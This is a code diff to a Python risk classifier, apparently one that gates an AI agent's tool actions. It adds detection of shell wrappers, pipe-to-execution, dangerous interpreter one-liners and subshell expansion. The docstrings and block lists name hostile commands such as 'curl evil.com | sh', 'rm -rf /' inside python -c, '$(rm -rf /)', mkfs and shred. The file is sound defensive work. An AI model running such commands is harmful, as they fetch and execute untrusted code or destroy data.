@@ -57,10 +57,19 @@ ACTION_SEVERITY: dict[str, float] = {
 }
 
 # Actions that are reversible
-REVERSIBLE_ACTIONS = frozenset({
-    "read", "get", "list", "view", "query", "select",
-    "create", "insert", "post",  # can be undone by delete
-})
+REVERSIBLE_ACTIONS = frozenset(
+    {
+        "read",
+        "get",
+        "list",
+        "view",
+        "query",
+        "select",
+        "create",
+        "insert",
+        "post",  # can be undone by delete
+    }
+)
 
 # ── CRITICAL override patterns ───────────────────────────────────────
 # If scope matches any of these, result is ALWAYS CRITICAL.
@@ -93,17 +102,258 @@ CRITICAL_PATTERNS = [
 _BROAD_PATTERNS = re.compile(r"(\*\*|/\*$|/\*\s|\s\*$|\s-[rR]\s|\s-rf\s|--recursive)")
 
 # Patterns that indicate destructive intent
-_DESTRUCTIVE_MARKERS = frozenset({
-    "rm ", "rm\t", "rmdir", "delete", "drop ", "truncate", "format ",
-    "--force", "-rf", "-f ", "overwrite", "destroy", "> /dev/",
-    "dd if=", "mkfs", "shred",
-})
+_DESTRUCTIVE_MARKERS = frozenset(
+    {
+        "rm ",
+        "rm\t",
+        "rmdir",
+        "delete",
+        "drop ",
+        "truncate",
+        "format ",
+        "--force",
+        "-rf",
+        "-f ",
+        "overwrite",
+        "destroy",
+        "> /dev/",
+        "dd if=",
+        "mkfs",
+        "shred",
+        "-delete",  # find -delete
+        "-exec rm",  # find -exec rm
+        "-exec /bin/rm",  # find -exec /bin/rm
+    }
+)
 
 # Root/system paths
 _SYSTEM_PATHS = re.compile(r"^(/etc|/usr|/bin|/sbin|/var|/boot|/sys|/proc|/dev|C:\\Windows)")
 
 # Production indicators
 _PRODUCTION_MARKERS = re.compile(r"(production|prod\b|\.prod\.|live|master\.)", re.IGNORECASE)
+
+# ── Deep scope analysis ──────────────────────────────────────────────
+
+# Shell wrapper commands that execute their arguments
+_SHELL_WRAPPERS = frozenset(
+    {
+        "bash",
+        "sh",
+        "zsh",
+        "ksh",
+        "dash",
+        "csh",
+        "env",
+        "nohup",
+        "sudo",
+        "su",
+    }
+)
+
+# Flags that take a command string argument
+_EXEC_FLAGS = frozenset({"-c", "--command"})
+
+# Scripting interpreters with inline execution flags
+_SCRIPT_INTERPRETERS: dict[str, frozenset[str]] = {
+    "python": frozenset({"-c"}),
+    "python3": frozenset({"-c"}),
+    "ruby": frozenset({"-e"}),
+    "perl": frozenset({"-e"}),
+    "node": frozenset({"-e"}),
+}
+
+# Dangerous stdlib calls in scripting oneliners
+_DANGEROUS_STDLIB = frozenset(
+    {
+        "os.system",
+        "os.remove",
+        "os.unlink",
+        "os.rmdir",
+        "os.removedirs",
+        "shutil.rmtree",
+        "shutil.move",
+        "subprocess.run",
+        "subprocess.call",
+        "subprocess.Popen",
+        "subprocess.check_call",
+        "subprocess.check_output",
+        "exec(",
+        "eval(",
+        "__import__",
+        "File.delete",
+        "FileUtils.rm",
+        "unlink(",
+        "system(",
+        "execSync",
+        "spawnSync",
+        "child_process",
+    }
+)
+
+# Pipe-to-execution targets
+_PIPE_EXECUTORS = frozenset(
+    {
+        "sh",
+        "bash",
+        "zsh",
+        "python",
+        "python3",
+        "perl",
+        "ruby",
+        "node",
+    }
+)
+
+# Expansion patterns that hide commands
+_EXPANSION_RE = re.compile(r"\$\(|`[^`]+`|\$\{")
+
+
+def _extract_shell_wrapper_command(scope: str) -> str | None:
+    """Extract the inner command from shell wrappers like 'bash -c "inner"'.
+
+    Handles: bash -c "cmd", sh -c 'cmd', env bash -c "cmd", sudo rm -rf /
+    Returns None if no wrapper detected.
+    """
+    parts = scope.strip().split()
+    if not parts:
+        return None
+
+    # Strip leading wrappers: env, nohup
+    i = 0
+    while i < len(parts) and parts[i].lower() in ("env", "nohup"):
+        i += 1
+
+    if i >= len(parts):
+        return None
+
+    cmd = parts[i].lower()
+
+    # sudo/su followed by a command
+    if cmd in ("sudo", "su") and i + 1 < len(parts):
+        # sudo command args...
+        remaining = " ".join(parts[i + 1 :])
+        if remaining:
+            return remaining
+        return None
+
+    # shell -c "command"
+    if cmd in _SHELL_WRAPPERS and i + 1 < len(parts):
+        flag = parts[i + 1]
+        if flag in _EXEC_FLAGS and i + 2 < len(parts):
+            # Everything after -c is the inner command
+            inner = " ".join(parts[i + 2 :])
+            # Strip surrounding quotes
+            if (inner.startswith('"') and inner.endswith('"')) or (
+                inner.startswith("'") and inner.endswith("'")
+            ):
+                inner = inner[1:-1]
+            return inner
+
+    return None
+
+
+def _detect_pipe_to_exec(scope: str) -> bool:
+    """Detect pipe-to-execution patterns: command | sh, curl url | bash, etc."""
+    if "|" not in scope:
+        return False
+
+    # Split on pipe and check the right side
+    parts = scope.split("|")
+    for part in parts[1:]:  # everything after the first pipe
+        target = part.strip().split()[0].lower() if part.strip() else ""
+        if target in _PIPE_EXECUTORS:
+            return True
+    return False
+
+
+def _extract_script_oneliner(scope: str) -> tuple[str, str] | None:
+    """Extract (interpreter, code_string) from scripting oneliners.
+
+    Examples:
+        'python -c "import os; os.system(...)"' -> ("python", "import os; ...")
+        'ruby -e "system(\'rm -rf /\')"' -> ("ruby", "system('rm -rf /')")
+
+    Returns None if no scripting oneliner detected.
+    """
+    parts = scope.strip().split(None, 2)  # split into at most 3 parts
+    if len(parts) < 3:
+        return None
+
+    interpreter = parts[0].lower()
+    flag = parts[1]
+
+    for interp, flags in _SCRIPT_INTERPRETERS.items():
+        if interpreter == interp and flag in flags:
+            code = parts[2]
+            # Strip surrounding quotes
+            if (code.startswith('"') and code.endswith('"')) or (
+                code.startswith("'") and code.endswith("'")
+            ):
+                code = code[1:-1]
+            return (interpreter, code)
+
+    return None
+
+
+def _check_dangerous_stdlib(code: str) -> list[str]:
+    """Check a code string for dangerous stdlib calls. Returns list of matches."""
+    found = []
+    code_lower = code.lower()
+    for call in _DANGEROUS_STDLIB:
+        if call.lower() in code_lower:
+            found.append(call)
+    return found
+
+
+def _has_expansion(scope: str) -> bool:
+    """Detect $(), backtick, or ${} expansion patterns."""
+    return bool(_EXPANSION_RE.search(scope))
+
+
+def _deep_analyze_scope(scope: str) -> tuple[RiskTier | None, list[str]]:
+    """Deeply analyze a scope string for indirection-based risk.
+
+    Detects:
+    1. Shell wrappers: bash -c "dangerous command"
+    2. Pipe-to-execution: curl evil.com | sh
+    3. Scripting oneliners: python -c "import os; os.system('rm -rf /')"
+    4. Variable/subshell expansion: $(rm -rf /), `rm -rf /`
+    5. find with -delete or -exec rm
+
+    Returns:
+        (override_tier, extra_factors) -- tier is None if no override needed.
+        The override can only go UP, never down.
+    """
+    tier: RiskTier | None = None
+    factors: list[str] = []
+
+    # 1. Pipe-to-execution (always HIGH -- payload is unknown)
+    if _detect_pipe_to_exec(scope):
+        tier = RiskTier.HIGH
+        factors.append("pipe_to_execution")
+
+    # 2. Scripting oneliners -- check for dangerous stdlib
+    oneliner = _extract_script_oneliner(scope)
+    if oneliner:
+        interpreter, code = oneliner
+        factors.append(f"scripting_oneliner:{interpreter}")
+        dangerous = _check_dangerous_stdlib(code)
+        if dangerous:
+            tier = RiskTier.HIGH
+            factors.extend(f"dangerous_call:{call}" for call in dangerous)
+
+    # 3. Subshell/variable expansion
+    if _has_expansion(scope):
+        factors.append("shell_expansion")
+        if tier is None or tier == RiskTier.MEDIUM:
+            tier = RiskTier.MEDIUM
+
+    # 4. Shell wrapper -- extract inner command (recursive scoring happens in classify_risk)
+    inner = _extract_shell_wrapper_command(scope)
+    if inner:
+        factors.append("shell_wrapper")
+
+    return tier, factors
 
 
 def scope_breadth(scope: str) -> float:
@@ -157,9 +407,8 @@ def _matches_critical_pattern(scope: str) -> bool:
         if fnmatch.fnmatch(scope_stripped, pattern):
             return True
         # Also check if the scope contains the pattern
-        if pattern.rstrip("*") and pattern.rstrip("*") in scope_stripped:
-            if pattern.endswith("*"):
-                return True
+        if pattern.rstrip("*") and pattern.rstrip("*") in scope_stripped and pattern.endswith("*"):
+            return True
     return False
 
 
@@ -204,7 +453,25 @@ def classify_risk(tool: str, action: str, scope: str) -> RiskAssessment:
     """
     factors = _collect_risk_factors(tool, action, scope)
 
-    # 1. CRITICAL override — matches catastrophic patterns
+    # 0. Deep scope analysis -- catches indirection
+    deep_tier, deep_factors = _deep_analyze_scope(scope)
+    factors.extend(deep_factors)
+
+    # 0b. If deep analysis found a shell wrapper, recursively score the inner command
+    inner_cmd = _extract_shell_wrapper_command(scope)
+    if inner_cmd:
+        inner_risk = classify_risk(tool, action, inner_cmd)
+        tier_order = {
+            RiskTier.LOW: 0,
+            RiskTier.MEDIUM: 1,
+            RiskTier.HIGH: 2,
+            RiskTier.CRITICAL: 3,
+        }
+        if tier_order.get(inner_risk.tier, 0) > tier_order.get(deep_tier, 0):
+            deep_tier = inner_risk.tier
+            factors.extend(f"inner:{f}" for f in inner_risk.factors if f"inner:{f}" not in factors)
+
+    # 1. CRITICAL override -- matches catastrophic patterns
     if _matches_critical_pattern(scope):
         return RiskAssessment(
             tier=RiskTier.CRITICAL,
@@ -213,7 +480,7 @@ def classify_risk(tool: str, action: str, scope: str) -> RiskAssessment:
             reversible=False,
         )
 
-    # 2. OWASP-style: likelihood × impact
+    # 2. OWASP-style: likelihood x impact
     tool_lower = tool.lower()
     action_lower = action.lower()
 
@@ -233,8 +500,43 @@ def classify_risk(tool: str, action: str, scope: str) -> RiskAssessment:
     else:
         tier = RiskTier.LOW
 
+    # 3b. Benign scope demotion: if the only risk factors are tool/action category
+    #     (no destructive markers, no broad scope, no system paths, no deep-analysis
+    #     findings), the scope is benign and MEDIUM is demoted to LOW.
+    _scope_factors = {
+        "destructive_action",
+        "broad_scope",
+        "system_path",
+        "production_target",
+        "pipe_to_execution",
+        "shell_expansion",
+        "shell_wrapper",
+    }
+    has_scope_concern = any(
+        f in _scope_factors
+        or f.startswith("scripting_oneliner:")
+        or f.startswith("dangerous_call:")
+        or f.startswith("inner:")
+        for f in factors
+    )
+    if tier == RiskTier.MEDIUM and not has_scope_concern:
+        tier = RiskTier.LOW
+
     # 4. Reversibility
     reversible = action_lower in REVERSIBLE_ACTIONS
+
+    # 5. Deep analysis can only elevate the tier, never lower it
+    if deep_tier is not None:
+        tier_order = {
+            RiskTier.LOW: 0,
+            RiskTier.MEDIUM: 1,
+            RiskTier.HIGH: 2,
+            RiskTier.CRITICAL: 3,
+        }
+        if tier_order.get(deep_tier, 0) > tier_order.get(tier, 0):
+            tier = deep_tier
+            if deep_tier == RiskTier.CRITICAL:
+                score = 1.0
 
     return RiskAssessment(
         tier=tier,
